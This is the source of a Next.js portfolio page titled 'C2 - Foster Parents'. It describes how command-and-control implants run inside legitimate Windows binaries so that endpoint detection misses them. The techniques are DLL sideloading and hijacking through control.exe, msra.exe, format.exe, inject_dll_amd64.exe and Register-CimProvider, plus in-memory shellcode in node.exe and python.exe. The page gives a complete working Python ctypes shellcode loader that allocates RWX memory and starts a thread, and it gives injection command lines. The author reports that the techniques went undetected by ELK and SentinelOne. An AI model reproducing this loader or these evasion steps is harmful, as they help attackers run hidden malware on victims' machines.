import { Metadata } from "next";
import Link from "next/link";
import Image from "next/image";

export const metadata: Metadata = {
  title: "C2 - Foster Parents - Youssef Ennaciri",
  description: "Various techniques for C2 operations using legitimate executables to avoid detection",
};

export default function C2FosterParentsProject() {
  return (
    <section className="relative">
      <div className="max-w-4xl mx-auto px-4 sm:px-6">
        <div className="pt-32 pb-12 md:pt-40 md:pb-20">
          <Link 
            href="/projects" 
            className="inline-flex items-center text-indigo-400 hover:text-indigo-300 mb-8"
          >
            <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path>
            </svg>
            Back to Projects
          </Link>
          
          <article className="max-w-none">
            <h1 className="h1 mb-6 font-nacelle text-gray-200 text-4xl md:text-5xl">C2 - Foster Parents</h1>
            
            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Node.js In-Memory Shellcode</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              Following the widely publicized NPM blockchain compromise, increased attention was directed toward the behavior of node.exe. This led to a focused assessment of how Node.js can be leveraged for stealthy post‑compromise activity. Because node.exe routinely generates legitimate HTTPS traffic, it provides a natural level of cover that can obscure command‑and‑control communication.
            </p>

            <p className="text-lg text-indigo-200/65 mb-4">
              The project examined how Node.js can be used to execute malicious payloads directly in memory. In this approach, shellcode is loaded and run within the node.exe process without creating additional processes or writing files to disk. This behavior is made possible through Node.js's capability to interact with native code and Windows APIs, enabling in‑memory execution that is difficult for traditional security controls to detect.
            </p>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-1.png"
                alt="C2 implant running within node.exe process"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-2.png"
                alt="Process screenshot"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <p className="text-lg text-indigo-200/65 mb-4">
              My future plan is to upgrade this project to be more stealthy, as for now I've tested on ELK and SentinelOne and the results are as usual no detections.
            </p>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Control.exe - Dll Sideloading</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              By invoking <code className="bg-gray-800 px-1 rounded">control.exe</code> with the syntax <code className="bg-gray-800 px-1 rounded">control "C:\path\to\implant.dll"</code> the Windows Control Panel loader (<code className="bg-gray-800 px-1 rounded">control.exe</code>) loads the DLL under the context of <code className="bg-gray-800 px-1 rounded">rundll32.exe</code> as the <strong>parent process</strong> (due to COM activation). This technique leverages the <strong>Control Panel Item (`.cpl`)</strong> execution mechanism, where <code className="bg-gray-800 px-1 rounded">CPlApplet</code> is the designated entry point. When the DLL is loaded, <code className="bg-gray-800 px-1 rounded">rundll32.exe</code> spawns as a child of <code className="bg-gray-800 px-1 rounded">explorer.exe</code> (if executed via GUI) or the calling process (if run from CLI), while the actual payload executes within <code className="bg-gray-800 px-1 rounded">control.exe</code>'s memory space.
            </p>

            <p className="text-lg text-indigo-200/65 mb-4">
              Detection evasion is achieved by <strong>process ancestry spoofing</strong>, as monitoring tools often focus on child-parent relationships (e.g., <code className="bg-gray-800 px-1 rounded">rundll32</code> spawning from <code className="bg-gray-800 px-1 rounded">cmd.exe</code> is suspicious, but <code className="bg-gray-800 px-1 rounded">control.exe</code> invoking <code className="bg-gray-800 px-1 rounded">rundll32</code> appears benign). The DLL must export <code className="bg-gray-800 px-1 rounded">CPlApplet</code> to comply with the expected function prototype (<code className="bg-gray-800 px-1 rounded">int APIENTRY CPlApplet(HWND hwndCPL, UINT msg, LPARAM lParam1, LPARAM lParam2)</code>).
            </p>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-3.png"
                alt="Control.exe sideloading screenshot"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-4.png"
                alt="Process tree screenshot"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-5.png"
                alt="Additional screenshot"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Python.exe - Dll Sideloading</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              The <strong><code className="bg-gray-800 px-1 rounded">ctypes</code></strong> module in Python allows direct interaction with the Windows API, enabling <strong>in-process DLL loading</strong> without spawning a child process. By calling <strong><code className="bg-gray-800 px-1 rounded">ctypes.WinDLL()</code></strong> or <strong><code className="bg-gray-800 px-1 rounded">ctypes.CDLL()</code></strong>, we can load a DLL into <code className="bg-gray-800 px-1 rounded">python.exe</code>'s memory space, avoiding suspicious process creation (e.g., <code className="bg-gray-800 px-1 rounded">rundll32.exe</code>). The payload executes within Python's process context, blending in with legitimate scripting activity.
            </p>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-6.png"
                alt="Python sideloading screenshot"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Python.exe - Load Shellcode</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              Same as mentioned before <strong><code className="bg-gray-800 px-1 rounded">ctypes</code></strong> module in Python allows direct interaction with the Windows API. This allows to directly load shellcode into the process memory of python.exe by calling Windows APIs.
            </p>

            <p className="text-lg text-indigo-200/65 mb-4">
              The below script loads shellcode in the simplest manner, it can easily be improved by adding stealth techniques like such as encrypting shellcode, env keying, fileless shellcode and more.
            </p>

            <pre className="bg-gray-800/50 p-4 rounded-lg mb-4 overflow-x-auto">
              <code className="text-gray-200">
{`import ctypes as kk
import sys

def O(shl_f):
    with open(shl_f, 'rb') as f:
        b_x = f.read()

    kk.windll.kernel32.VirtualAlloc.restype = kk.c_void_p
    kk.windll.kernel32.CreateThread.argtypes = (
        kk.c_int, kk.c_int, kk.c_void_p, kk.c_int, kk.c_int, kk.POINTER(kk.c_int)
    )

    spc = kk.windll.kernel32.VirtualAlloc(
        kk.c_int(0), kk.c_int(len(b_x)), kk.c_int(0x3000), kk.c_int(0x40)
    )
    bf = (kk.c_char * len(b_x)).from_buffer_copy(b_x)
    kk.windll.kernel32.RtlMoveMemory(kk.c_void_p(spc), bf, kk.c_int(len(b_x)))
    hndl = kk.windll.kernel32.CreateThread(
        kk.c_int(0), kk.c_int(0), kk.c_void_p(spc), kk.c_int(0), kk.c_int(0),
        kk.pointer(kk.c_int(0))
    )
    kk.windll.kernel32.WaitForSingleObject(hndl, kk.c_uint32(0xffffffff))
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python code-py.py shellcode file")
    else:
        shl_f = sys.argv[1]
        O(shl_f)`}
              </code>
            </pre>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-7.png"
                alt="Python shellcode execution screenshot"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">msra.exe - DLL Sideloading</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              By default, <strong><code className="bg-gray-800 px-1 rounded">msra.exe</code></strong> (Microsoft Remote Assistance) attempts to load <strong><code className="bg-gray-800 px-1 rounded">userenv.dll</code></strong> from its directory upon execution, calling the exported function <strong><code className="bg-gray-800 px-1 rounded">GetProfileType</code></strong> during initialization. This behavior enables <strong>DLL hijacking</strong> when a implant DLL (renamed to <code className="bg-gray-800 px-1 rounded">userenv.dll</code>) is placed alongside <code className="bg-gray-800 px-1 rounded">msra.exe</code>, forcing the OS loader to prioritize the local directory over <code className="bg-gray-800 px-1 rounded">System32</code>.
            </p>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-8.png"
                alt="changing the export function for the implant dll"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-9.png"
                alt="C2 over msra.exe dll hijack"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Microsoft.NodejsTools.PressAnyKey.exe</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              <code className="bg-gray-800 px-1 rounded">Microsoft.NodejsTools.PressAnyKey.exe</code> is a utility bundled with <strong>Visual Studio's Node.js development tools</strong>, designed to pause console applications (e.g., "Press any key to continue..."). It accepts command-line arguments to <strong>launch a process</strong> before waiting for user input.
            </p>

            <p className="text-lg text-indigo-200/65 mb-4">
              This can abuse this to execute a binary files (<code className="bg-gray-800 px-1 rounded">DaBombC4.exe</code>) as a <strong>child process</strong> while maintaining a benign parent process tree.
            </p>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-10.png"
                alt="Process screenshot"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <p className="text-lg text-indigo-200/65 mb-4">
              This binary can be found on the below location as Microsoft signed binary.
            </p>

            <pre className="bg-gray-800/50 p-4 rounded-lg mb-4">
              <code className="text-gray-200">
C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\Microsoft\NodeJsTools\NodeJsTools
              </code>
            </pre>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-11.png"
                alt="File location screenshot"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-12.png"
                alt="Process Hacker screenshot"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <p className="text-lg text-indigo-200/65 mb-4">
              The Process Hacker shows the implant binary running under <code className="bg-gray-800 px-1 rounded">Microsoft.NodejsTools.PressAnyKey.exe</code>
            </p>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-13.png"
                alt="Process Hacker screenshot showing implant"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Format - DLL Sideloading</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              A lesser-known DLL sideloading technique abuses the Windows <code className="bg-gray-800 px-1 rounded">format.exe</code> binary by supplying a fake filesystem type via the <code className="bg-gray-800 px-1 rounded">/fs</code> parameter.
            </p>

            <p className="text-lg text-indigo-200/65 mb-4">
              When executing <code className="bg-gray-800 px-1 rounded">format C: /fs:test</code>, Windows attempts to load <code className="bg-gray-800 px-1 rounded">utest.dll</code> from the current directory. I crafted <code className="bg-gray-800 px-1 rounded">utest.dll</code> the DLL's <code className="bg-gray-800 px-1 rounded">DllMain</code> function is executed within the context of the <code className="bg-gray-800 px-1 rounded">format.exe</code> process. In this demonstration, a <code className="bg-gray-800 px-1 rounded">utest.dll</code> payload displays a message box when triggered. Process Hacker confirms the <code className="bg-gray-800 px-1 rounded">format.exe</code> process in memory with the loaded malicious DLL.
            </p>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-14.png"
                alt="Format.exe DLL sideloading"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <p className="text-lg text-indigo-200/65 mb-4">
              The downside to this technique is that I found it challenging to load implant DLL
            </p>

            <p className="text-lg text-indigo-200/65 mb-4">
              DllMain has strict limitations in regards to executing WinAPI calls, this interapts the implant execution routine.
            </p>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Inject_dll_amd64.exe - DLL Sideloading</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              Microsoft signed binary allows for DLL sideload
            </p>

            <pre className="bg-gray-800/50 p-4 rounded-lg mb-4">
              <code className="text-gray-200">
inject_dll_amd64.exe 5188 DaBombC4.dll
              </code>
            </pre>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-15.png"
                alt="Injection process screenshot"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Register-CimProvider.exe - Dll Sideloading</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              This a potenialy vulnerable Windows binary for DLL hijacking, it requires serveral specific export function from the imported implant dll file.
            </p>

            <div className="my-6">
              <Image
                src="/images/projects/foster-parents-16.png"
                alt="Register-CimProvider.exe hijacking"
                className="rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>
          </article>
        </div>
      </div>
    </section>
  );
}